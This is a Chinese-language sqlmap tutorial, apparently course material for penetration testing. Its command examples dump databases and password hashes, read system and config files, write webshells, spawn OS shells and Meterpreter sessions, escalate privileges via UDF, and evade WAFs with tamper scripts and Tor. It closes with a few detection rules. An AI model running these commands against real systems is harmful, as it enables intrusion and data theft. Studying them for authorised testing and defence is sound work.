# sqlmap SQL注入自动化工具——从入门到精通

> 分类：工具指南 | 难度：进阶 | 阅读时间：约50分钟

## 概述

sqlmap 是全球最强大的开源 SQL 注入检测与利用工具，由 Bernardo Damele 和 Miroslav Stampar 开发维护，用 Python 编写。它能自动检测 Web 应用中的 SQL 注入漏洞，支持 MySQL、PostgreSQL、Oracle、MSSQL、SQLite、Access 等几乎所有主流数据库，并能完成数据提取、文件读写、命令执行等操作。无论是渗透测试、SRC 漏洞挖掘，还是 CTF 解题，sqlmap 都是必须精通的武器。

**支持的数据注入技术**：
- 基于布尔的盲注（Boolean-based blind）
- 基于时间的盲注（Time-based blind）
- 基于报错的注入（Error-based）
- 联合查询注入（UNION query）
- 堆叠查询注入（Stacked queries）
- 带外注入（Out-of-band）

## 核心知识点

- sqlmap 的基础使用流程：从探测到数据提取
- 六种注入技术的识别与应用场景
- 请求配置：Cookie、Header、POST、User-Agent、Referer
- 数据提取：数据库名→表名→列名→数据
- 高级功能：文件读写、命令执行、UDF 提权
- WAF/IPS 绕过：tamper 脚本体系
- 自动化与批处理：批量扫描多个目标

---

## 一、安装与基础配置

### 1.1 安装

```bash
# Kali Linux / Debian / Ubuntu
sudo apt install sqlmap -y

# macOS
brew install sqlmap

# 从源码安装（获取最新版）
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version

# 或直接运行（系统级安装后）
sqlmap --version
```

### 1.2 更新

```bash
sqlmap --update
# 或
cd sqlmap && git pull
```

### 1.3 验证安装

```bash
sqlmap --version
# 期望输出：sqlmap/1.8.x#stable
sqlmap --wizard     # 交互式引导模式
```

---

## 二、基础使用流程

### 2.1 核心命令格式

```bash
# 最简用法：自动检测 GET 参数注入
sqlmap -u "http://target.com/page.php?id=1"

# 完整流程命令
sqlmap -u "http://target.com/page.php?id=1" \
       --dbs \                          # 列出数据库
       --batch \                        # 使用默认选项
       --random-agent                   # 随机 User-Agent
```

### 2.2 标准数据提取流程

```bash
# 阶段1：检测注入点
sqlmap -u "http://target.com/page.php?id=1" --batch

# 阶段2：枚举数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 阶段3：枚举指定数据库的表
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 阶段4：枚举指定表的列
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# 阶段5：导出数据
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name \
       -C column1,column2 --dump

# 一键导出所有数据
sqlmap -u "http://target.com/page.php?id=1" -D database_name --dump-all
```

---

## 三、六种注入技术详解

### 3.1 Boolean-based blind（布尔盲注）

```bash
# 原理：根据页面返回的 TRUE/FALSE 状态逐字节推断数据
sqlmap -u "http://target.com/page.php?id=1" --technique=B

# sqlmap 默认自动检测，会优先使用最快的方式
# 布尔盲注速度取决于每次请求的响应时间
```

### 3.2 Time-based blind（时间盲注）

```bash
# 原理：通过 SQL 函数（如 sleep、benchmark）引入延迟判断
sqlmap -u "http://target.com/page.php?id=1" --technique=T

# 时间盲注通常最慢（每字节需等待数秒），但适用范围最广
sqlmap -u "http://target.com/page.php?id=1" \
       --technique=T \
       --time-sec=2         # 设置时间延迟阈值（默认5秒）
```

### 3.3 Error-based（报错注入）

```bash
# 原理：触发数据库报错，错误信息中包含查询结果
sqlmap -u "http://target.com/page.php?id=1" --technique=E

# MySQL 常见报错函数：extractvalue、updatexml、floor
# 报错注入速度快，但需要目标显示数据库错误信息
```

### 3.4 UNION query（联合查询）

```bash
# 原理：使用 UNION SELECT 将数据附加到正常查询结果中
sqlmap -u "http://target.com/page.php?id=1" --technique=U

# 联合查询是最快的注入方式，但需要知道原本查询的列数
sqlmap -u "http://target.com/page.php?id=1" \
       --technique=U \
       --union-cols=5 \     # 指定 UNION 列数（默认自动探测）
       --union-char=123     # 联合查询占位符
```

### 3.5 Stacked queries（堆叠查询）

```bash
# 原理：在一个语句中执行多条 SQL 命令（需要数据库支持多语句）
sqlmap -u "http://target.com/page.php?id=1" --technique=S

# 建议与 --os-shell 结合使用
sqlmap -u "http://target.com/page.php?id=1" \
       --os-shell \
       --technique=S
```

### 3.6 指定注入技术

```bash
# 指定单一技术
sqlmap -u "http://target.com/page.php?id=1" --technique=B

# 指定多种技术（逗号分隔）
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST

# 排除某种技术
# 默认是 BEUST（去除某一项即可，如 BET 排除联合查询）
```

---

## 四、请求配置详解

### 4.1 POST 请求

```bash
# 指定 POST 数据
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"

# 从文件读取 POST 数据
sqlmap -u "http://target.com/api/login" --data="@post_data.txt"

# 从 Burp 复制的完整请求文件
# Burp → 右键 → Save item → 保存为 request.txt
sqlmap -r request.txt
```

### 4.2 Cookie 与 Header

```bash
# Cookie 注入
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123; id=1*"

# 自定义 Header
sqlmap -u "http://target.com/page.php?id=1" \
       --headers="X-Forwarded-For: 127.0.0.1\nX-Forwarded-Host: localhost"

# 常用的 Header 注入测试
sqlmap -u "http://target.com/page.php" \
       -H "User-Agent: *" \
       -H "Referer: *" \
       -H "X-Forwarded-For: *"
```

### 4.3 认证与代理

```bash
# Basic Auth
sqlmap -u "http://target.com/admin.php?id=1" \
       --auth-type=Basic \
       --auth-cred="admin:password"

# 通过代理（Burp 联动）
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# SOCKS 代理
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks4://127.0.0.1:1080"

# Tor 网络
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5
```

### 4.4 延迟与线程

```bash
# 请求延迟（避免触发保护）
sqlmap -u "http://target.com/page.php?id=1" --delay=1

# 多线程（默认1，最大10）
sqlmap -u "http://target.com/page.php?id=1" --threads=3

# 超时设置
sqlmap -u "http://target.com/page.php?id=1" --timeout=30
```

---

## 五、数据提取高级功能

### 5.1 选择性导出

```bash
# 仅导出前 N 行
sqlmap -u "..." -T users --dump --start=1 --stop=10

# 条件导出
sqlmap -u "..." -T users --dump --where="id>=100"

# 仅导出表结构
sqlmap -u "..." -T users --columns

# 搜索特定的列名
sqlmap -u "..." --search -C username,password,email

# 搜索特定的表名
sqlmap -u "..." --search -T admin,user,users

# 查看当前数据库用户
sqlmap -u "http://target.com/page.php?id=1" --current-user

# 查看当前数据库
sqlmap -u "http://target.com/page.php?id=1" --current-db

# 查看所有用户
sqlmap -u "http://target.com/page.php?id=1" --users

# 查看用户密码哈希
sqlmap -u "http://target.com/page.php?id=1" --passwords

# 查看用户权限
sqlmap -u "http://target.com/page.php?id=1" --privileges

# 查看数据库用户角色
sqlmap -u "http://target.com/page.php?id=1" --roles

# 搜索数据库名/表名/列名
sqlmap -u "http://target.com/page.php?id=1" --search -C password,passwd,pass
```

---

## 六、文件读写与命令执行

### 6.1 文件读取

```bash
# 读取文件（需要 FILE 权限）
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Windows 文件读取
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# 读取 Web 配置文件（常用）
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/wp-config.php"
sqlmap -u "http://target.com/page.php?id=1" --file-read="WEB-INF/web.xml"
```

### 6.2 文件写入

```bash
# 写入 Webshell
sqlmap -u "http://target.com/page.php?id=1" \
       --file-write="/tmp/shell.php" \
       --file-dest="/var/www/html/shell.php"
```

### 6.3 命令执行

```bash
# 尝试多种方式执行命令
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="id;uname -a"

# 获取交互式 Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 获取 Meterpreter（需 Metasploit）
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# 获取反向 TCP Shell（连接回攻击机）
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### 6.4 UDF 提权

```bash
# MySQL UDF 注入（需要插件目录写入权限）
sqlmap -u "http://target.com/page.php?id=1" --udf-inject

# 自定义 UDF 路径
sqlmap -u "http://target.com/page.php?id=1" \
       --udf-inject \
       --shared-lib=/usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so
```

---

## 七、Tamper 脚本——WAF/IPS 绕过

### 7.1 Tamper 脚本体系

sqlmap 内置 60+ tamper 脚本，位于 `sqlmap/tamper/` 目录：

```bash
# 列出所有 tamper 脚本
sqlmap --list-tampers

# 使用单个 tamper 脚本
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# 使用多个 tamper 脚本（逗号分隔，按顺序执行）
sqlmap -u "http://target.com/page.php?id=1" \
       --tamper=space2comment,between,randomcase

# 查看 tamper 脚本说明
cat /usr/share/sqlmap/tamper/space2comment.py
```

### 7.2 常用 Tamper 脚本分类

**空格绕过**：
| 脚本 | 效果 |
|:---|:---|
| `space2comment` | 空格→`/**/` |
| `space2plus` | 空格→`+` |
| `space2hash` | 空格→`%23%0A` |
| `space2mysqldash` | 空格→`--%0A` |
| `space2randomblank` | 随机空白字符 |
| `spaces2mssqlblank` | MSSQL 特殊空白字符 |
| `spaces2mssqlhash` | MSSQL 换行符混淆 |

**关键字绕过**：
| 脚本 | 效果 |
|:---|:---|
| `randomcase` | 随机大小写 |
| `uppercase` | 全大写 |
| `lowercase` | 全小写 |
| `symboliclogical` | AND→&&, OR→\|\| |
| `commentoutparentheses` | 括号后加注释 |
| `charencode` | URL 编码所有字符 |
| `chardoubleencode` | 双重 URL 编码 |
| `charunicodeencode` | Unicode 编码 |
| `percentage` | 每个字符前加% |
| `equaltolike` | = → LIKE |
| `equaltomysqlblank` | = → MySQL 空白绕过 |
| `greatest` | > 绕到 GREATEST 表达式 |

**高级混淆**：
| 脚本 | 效果 |
|:---|:---|
| `between` | > → NOT BETWEEN 0 AND |
| `modsecurityversioned` | 利用版本注释绕过 ModSecurity |
| `modsecurityzeroversioned` | 零版本注释绕过 |
| `apostrophemask` | 单引号 → UTF-8 全角 |
| `apostrophenullencode` | 单引号后加 %00 |
| `base64encode` | 参数值 Base64 编码 |
| `htmlencode` | HTML 实体编码 |
| `hex2char` | Hex 字符串转 CHAR() 函数 |
| `overlongutf8` | 超长 UTF-8 编码（CVE-2022 相关）|
| `xforwardedfor` | 伪造 X-Forwarded-For 头 |

### 7.3 Tamper 组合策略

```bash
# CloudFlare 绕过组合
sqlmap -u "..." --tamper=between,randomcase,charencode,space2comment

# ModSecurity 绕过组合
sqlmap -u "..." --tamper=modsecurityversioned,modsecurityzeroversioned,space2comment,randomcase

# 通用绕过组合（先尝试最轻量的）
sqlmap -u "..." --tamper=space2comment,randomcase,between

# 强力绕过组合（对目标冲击较大）
sqlmap -u "..." --tamper=apostrophemask,apostrophenullencode,charencode,chardoubleencode,randomcase,space2comment,space2randomblank
```

---

## 八、高级检测配置

### 8.1 详细输出与调试

```bash
# 详细输出级别（-v 1~6）
sqlmap -u "http://target.com/page.php?id=1" -v 3    # payload 级别
sqlmap -u "http://target.com/page.php?id=1" -v 6    # 全量调试（最详细）

# 保存流量（配合 Burp 分析）
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" -v 3
```

### 8.2 自定义检测参数

```bash
# 自定义注入位置（用 * 标记）
sqlmap -u "http://target.com/page.php?id=1*&sort=desc*"

# 指定参数进行测试
sqlmap -u "http://target.com/page.php?id=1&x=2&y=3" -p "id,x"

# 跳过某些参数
sqlmap -u "http://target.com/page.php?id=1&token=abc" --skip="token"

# 参数值中需指定注入位置
# URI: id=1 → sqlmap 默认全测，id=1* → 仅测 id

# 指定测试等级（1-5，默认1）
sqlmap -u "http://target.com/page.php?id=1" --level=3

# 指定风险等级（1-3，默认1）
sqlmap -u "http://target.com/page.php?id=1" --risk=2
```

### 8.3 Level 与 Risk 详解

| 等级 | Level 效果 | Risk 效果 |
|:---|:---|:---|
| 1 | 测试 GET/POST 参数 | 常规 Payload（不太可能破坏数据）|
| 2 | + Cookie 参数 | + 基于时间的重型查询 |
| 3 | + User-Agent/Referer 头 | + OR-based Payload（可能修改数据）|
| 4 | + 更多 HTTP Header | |
| 5 | + Host 头 | |

### 8.4 页面分析与过滤

```bash
# 字符串匹配（成功/失败特征）
sqlmap -u "http://target.com/page.php?id=1" \
       --string="Welcome back"       # 成功时页面的必然字符串

# 正则匹配
sqlmap -u "http://target.com/page.php?id=1" \
       --regexp="User: \w+"

# 排除特定状态码
sqlmap -u "http://target.com/page.php?id=1" \
       --ignore-code=401,403

# 自定义重定向处理
sqlmap -u "http://target.com/page.php?id=1" \
       --ignore-redirects
```

---

## 九、批量扫描与自动化

### 9.1 从文件批量扫描

```bash
# 目标列表（每行一个 URL）
sqlmap -m targets.txt

# 从 Burp 日志文件
sqlmap -l burp.log

# 从文件读取+扫描（全量）
cat targets.txt | while read url; do
    sqlmap -u "$url" --batch --dbs --random-agent
done
```

### 9.2 自动保存结果

```bash
# 指定输出目录
sqlmap -u "http://target.com/page.php?id=1" \
       --output-dir=/tmp/sqlmap_results

# 导出 CSV
sqlmap -u "http://target.com/page.php?id=1" \
       -T users --dump --csv-del=";"
```

### 9.3 与 Metasploit 联动

```bash
# 尝试获取 Meterpreter 会话
sqlmap -u "http://target.com/page.php?id=1" --os-pwn \
       --msf-path=/usr/share/metasploit-framework

# sqlmap 自动调用 msfconsole 处理连接
```

---

## 十、实战场景

### 场景一：GET 参数标准渗透

```bash
sqlmap -u "http://target.com/product.php?id=1" \
       --batch \
       --random-agent \
       --dbs
```

### 场景二：POST JSON 注入

```bash
sqlmap -u "http://target.com/api/login" \
       --data='{"user":"admin","pass":"123"}' \
       --dbms=mysql \
       --level=3
```

### 场景三：Cookie 注入

```bash
sqlmap -u "http://target.com/dashboard.php" \
       --cookie="id=1" \
       --level=2 \
       --dbs
```

### 场景四：Header 注入

```bash
sqlmap -u "http://target.com/" \
       -H "X-Forwarded-For: 127.0.0.1*" \
       --batch \
       --dbs
```

### 场景五：WAF 绕过实战

```bash
sqlmap -u "http://target.com/page.php?id=1" \
       --tamper=space2comment,randomcase,between \
       --random-agent \
       --delay=1 \
       --level=3 \
       --dbs
```

### 场景六：内网穿透测试

```bash
sqlmap -u "http://10.10.0.100/page.php?id=1" \
       --proxy="socks5://127.0.0.1:1080" \
       --batch
```

---

## 十一、常见问题与排错

| 问题 | 原因 | 解决方案 |
|:---|:---|:---|
| 参数无动态内容 | URI 不含参数 | 指定 `--data` 或用 `-r` 从文件导入 |
| WAF/IPS 拦截 | 被安全设备检测 | 使用 `--tamper` + `--delay` + `--random-agent` |
| 所有测试为 negative | 无 SQL 注入或正则不匹配 | 提高 `--level` 和 `--risk`，设置 `--string` |
| 误报 | 页面变化触发 | 设置 `--string` 或 `--regexp` 精确匹配 |
| 响应过大/超时 | 目标响应速度慢 | 加大 `--timeout`，降低 `--threads` |
| 数据库未知 | 指纹不足 | 手动指定 `--dbms=mysql` |

---

## 十二、速查卡

```
完整流程：       sqlmap -u "URL" --dbs --tables --columns --dump
指定测试参数：   -p "id,name"
POST 数据：      --data="user=admin&pass=123"
从文件加载：     -r request.txt
Cookie 测试：    --cookie="PHPSESSID=abc" --level=2
Tamper 绕过：    --tamper=space2comment,randomcase,between
随机 UA：        --random-agent
请求延迟：       --delay=1
指定数据库：     --dbms=mysql
多线程：         --threads=5
通过代理：       --proxy="http://127.0.0.1:8080"
自动确认：       --batch
调试输出：       -v 3
文件读取：       --file-read="/etc/passwd"
命令执行：       --os-shell
```

---

## 十三、Tamper 脚本体系深度解析

### 13.1 Tamper 分类与选用策略

| Tamper 脚本 | 作用 | 适用场景 |
|:---|:---|:---|
| **apostrophemask** | 单引号 → UTF-8 全角 | 简单 WAF 绕过 |
| **base64encode** | Base64 编码注入 payload | JSON/XML 注入点 |
| **between** | 比较符 → BETWEEN | 过滤 >、= 号 |
| **bluecoat** | 空格 → %09，替换比较符 | BlueCoat 设备 |
| **chardoubleencode** | 双重 URL 编码 | URL 解码器绕过 |
| **charencode** | URL 编码所有字符 | 基本 URL 编码 |
| **charunicodeencode** | Unicode 编码 | ASP/ASP.NET |
| **equaltolike** | = → LIKE | 过滤等号的场景 |
| **greatest** | > → GREATEST() | 过滤比较符的 WAF |
| **halfversionedmorekeywords** | 添加 MySQL 版本注释 | MySQL 特定 WAF |
| **htmlencode** | HTML 实体编码 | 反射型 XSS 联合 |
| **ifnull2ifisnull** | IFNULL → IF(ISNULL()) | MySQL 函数过滤 |
| **information_schemacomment** | information_schema 加注释 | 过滤关键字 |
| **luanginx** | LUA+Nginx WAF 绕过 | 特定 WAF 产品 |
| **modsecurityversioned** | 注释分隔关键字 | ModSecurity |
| **modsecurityzeroversioned** | 零版本注释绕过 | ModSecurity |
| **multiplespaces** | 多个空格替换单空格 | 空格过滤不严 |
| **overlongutf8** | UTF-8 超长编码 | 弱 UTF-8 解析器 |
| **percentage** | 百分号包裹字符 | ASP 过滤 |
| **randomcase** | 随机大小写 | 大小写不敏感过滤 |
| **randomcomments** | 随机注释分割关键字 | 关键字过滤 |
| **space2comment** | 空格 → /**/ | 空格过滤 |
| **space2dash** | 空格 → --\n | MSSQL |
| **space2hash** | 空格 → #注释 | MySQL |
| **space2morehash** | 空格 → #更多#注释 | MySQL |
| **space2mssqlblank** | 空格 → MSSQL 空白字符 | MSSQL |
| **space2mysqlblank** | 空格 → MySQL 空白字符 | MySQL |
| **space2plus** | 空格 → + | URL 编码场景 |
| **versionedmorekeywords** | 版本注释包裹关键字 | MySQL |
| **xforwardedfor** | 添加 X-Forwarded-For 头 | IP 白名单绕过 |

### 13.2 Tamper 组合策略

```bash
# 轻量绕过（适用于简单 WAF）
--tamper=between,randomcase,space2comment

# 中等强度（ModSecurity / Cloud WAF）
--tamper=apostrophemask,space2hash,versionedmorekeywords,charencode

# 极限绕过（多层防御）
--tamper=space2comment,randomcase,between,charencode,greatest,versionedmorekeywords,bluecoat,percentage

# 自定义 Tamper 组合规则
# 1. 先用轻量组合探测
# 2. 根据拦截响应调整
# 3. 逐步增加 Tamper 直到成功
```

### 13.3 编写自定义 Tamper 脚本

```python
# tamper/my_custom_tamper.py
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    自定义 Tamper：替换敏感关键字为自定义编码
    
    Args:
        payload: 原始 SQL 注入 payload
        
    Returns:
        修改后的 payload
    """
    # 示例1：用 char() 函数替代字符串
    if payload:
        payload = payload.replace("SELECT", "SeLeCt")
        payload = payload.replace("UNION", "UnIoN")
        payload = payload.replace("SLEEP(", "SLEEP/**/(/**/")
        payload = payload.replace("AND", "&&")
        payload = payload.replace("OR", "||")
    return payload

# 使用
# sqlmap -u URL --tamper=my_custom_tamper
```

---

## 十四、高级注入技术

### 14.1 二阶 SQL 注入检测

```bash
# 二阶注入：注入的数据存储后在其他请求中触发
# 方法1：使用 sqlmap 的 --second-url
sqlmap -u "http://target.com/register.php" \
       --data="username=admin&password=123" \
       --second-url="http://target.com/profile.php" \
       --second-req="GET"

# 方法2：手动注入存储，sqlmap 扫描读取点
# 1. 手动在注册页面的 username 字段注入 payload
# 2. sqlmap 扫描 profile 页面
sqlmap -u "http://target.com/profile.php" \
       -p "username" --batch
```

### 14.2 带外注入（Out-of-Band）

```bash
# DNS 带外注入
sqlmap -u "http://target.com/page.php?id=1" \
       --dns-domain=yourdomain.com \
       --technique=O

# 需要配置 DNS 服务器
# 确保目标数据库支持 DNS 查询（如 Oracle UTL_HTTP）
```

### 14.3 绕过 CSRF Token

```bash
# 方法1：--csrf-token 自动处理
sqlmap -u "http://target.com/login.php" \
       --data="user=admin&pass=123&token=xxx" \
       --csrf-token="token"

# 方法2：--csrf-url 从独立页面获取 Token
sqlmap -u "http://target.com/update.php" \
       --data="name=test&csrf_token=xxx" \
       --csrf-url="http://target.com/token.php" \
       --csrf-token="csrf_token"
```

### 14.4 绕过验证码

```bash
# 使用 --eval 在每次请求前执行 Python 代码
sqlmap -u "http://target.com/login.php" \
       --data="user=admin&pass=123&captcha=xxx" \
       --eval="import hashlib; captcha = hashlib.md5(str(random.randint(1,9999))).hexdigest()[:5]"
```

---

## 十五、实战场景扩展

### 场景七：Cookie 注入 + 自定义 Header

```bash
sqlmap -u "http://target.com/index.php" \
       --cookie="PHPSESSID=abc; city=1*" \
       --level=2 \
       --headers="X-Forwarded-For: 127.0.0.1\nX-Real-IP: 10.0.0.1" \
       --random-agent \
       --batch
```

### 场景八：JSON/REST API 注入

```bash
# POST JSON 数据
sqlmap -u "http://target.com/api/user/search" \
       --data='{"name":"admin","age":30}' \
       --method=POST \
       --headers="Content-Type: application/json" \
       --dbms=mysql

# GraphQL 端点
sqlmap -u "http://target.com/graphql" \
       --data='{"query":"{user(id:1){name,email}}"}' \
       --method=POST
```

### 场景九：POST 参数+文件上传接口

```bash
sqlmap -u "http://target.com/upload.php" \
       --data="username=admin&file=test.jpg" \
       -p "username" \
       --batch
```

### 场景十：批量目标扫描

```bash
# 从 Burp 日志批量扫描
# 1. Burp → Save items → burp_log.txt
# 2. 提取 URL
cat burp_log.txt | grep "GET\|POST" | sort -u > urls.txt

# 批量扫描
sqlmap -m urls.txt --batch --random-agent --dbs

# 从 nmap 结果扫描 HTTP 服务
nmap -p80,443,8080,8443 --open -iL targets.txt -oG - | \
  awk '/open/{print "http://"$2}' | \
  xargs -I{} sqlmap -u {} --batch --crawl=3
```

---

## 十六、文件系统操作

### 16.1 文件读取

```bash
# 读取系统文件（需要 FILE 权限 + 知道路径）
sqlmap -u "http://target.com/page.php?id=1" \
       --file-read="/etc/passwd"
# 或 Windows
sqlmap -u "http://target.com/page.php?id=1" \
       --file-read="C:/Windows/win.ini"

# 读取结果保存在 ~/.sqlmap/output/target.com/files/
```

### 16.2 文件写入与 WebShell

```bash
# 写入文件（需要 FILE 权限 + secure_file_priv 为空）
sqlmap -u "http://target.com/page.php?id=1" \
       --file-write="shell.php" \
       --file-dest="/var/www/html/shell.php"

# 写入 Windows ASP WebShell
sqlmap -u "http://target.com/page.aspx?id=1" \
       --file-write="shell.aspx" \
       --file-dest="C:/inetpub/wwwroot/shell.aspx"
```

### 16.3 获取 OS Shell

```bash
# 交互式 OS Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 选择技术：PHP 的 system() / xp_cmdshell (MSSQL) / UDF (MySQL)
# sqlmap 自动上传 stager 并获取回连 shell

# 非交互模式执行命令
sqlmap -u "http://target.com/page.php?id=1" \
       --os-cmd="whoami"
```

---

## 十七、性能优化与网络调优

```bash
# 线程控制
sqlmap -u URL --threads=5      # 5 线程（默认 1）
sqlmap -u URL --threads=10     # 最大 10，过快可能被 WAF 检测

# 超时设置
sqlmap -u URL --timeout=30     # 连接超时 30 秒
sqlmap -u URL --time-sec=5     # 时间盲注等待时间

# 并发与延迟
sqlmap -u URL --delay=0.5      # 每次请求间隔 0.5 秒
sqlmap -u URL --safe-url="http://target.com/" --safe-freq=10  # 每 10 次请求访问一次 safe URL 避免超时

# 代理
sqlmap -u URL --proxy="http://127.0.0.1:8080"       # HTTP 代理
sqlmap -u URL --proxy="socks5://127.0.0.1:1080"     # SOCKS5 代理
sqlmap -u URL --tor --tor-type=SOCKS5               # Tor 匿名化
```

---

## 十八、报告与分析

```bash
# 生成详细报告
sqlmap -u URL --batch --dbs --output-dir=/tmp/sqlmap_report

# 查看结果
ls -la /tmp/sqlmap_report/target.com/
# log：详细日志
# session.sqlite：会话数据
# target.txt：目标信息

# 恢复会话
sqlmap -u URL --batch --dbs -s session.sqlite
```

---

## 十九、sqlmap 检测与规避

### 从防守方视角

```bash
# sqlmap 的典型特征
# 1. User-Agent: sqlmap/1.8.x#stable
# 2. 请求中包含随机注释 /* ... */
# 3. 短时间内大量含特殊字符的请求
# 4. 常见的测试参数名

# WAF 规则示例（ModSecurity）
# SecRule REQUEST_HEADERS:User-Agent "sqlmap" "id:100001,deny"
# SecRule ARGS "(\bSELECT\b.*\bFROM\b|\bUNION\b.*\bSELECT\b)" "id:100002,deny"
```

---

> 📖 本文为"网安百宝箱"课程配套读物。
> 参考：sqlmap 官方 Wiki https://github.com/sqlmapproject/sqlmap/wiki
> 更新于 2026-06-18
